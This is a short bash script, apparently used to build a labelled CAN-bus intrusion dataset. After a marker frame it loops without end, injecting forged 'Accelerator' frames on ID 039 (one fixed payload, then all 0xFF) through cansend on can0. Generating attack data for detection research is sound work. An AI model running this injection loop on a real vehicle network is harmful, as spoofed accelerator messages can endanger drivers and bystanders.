#!/bin/bash

# Automated multiple attacks with marker frames for attack labeling dataset generation
trap "cansend can0 010#01; echo 'Marker frame sent'; exit" SIGINT

count=0
while true; do
    # Send marker frame to indicate attack for data labeling
    while [[ $count -lt 1 ]]; do
        cansend can0 010#01
        sleep 0.1
        count=$((count + 1))
    done
    # Accelerator
    cansend can0 039#0FBFC100B6789000
    sleep 0.1
    cansend can0 039#FFFFFFFFFFFFFFFF
    sleep 0.1
done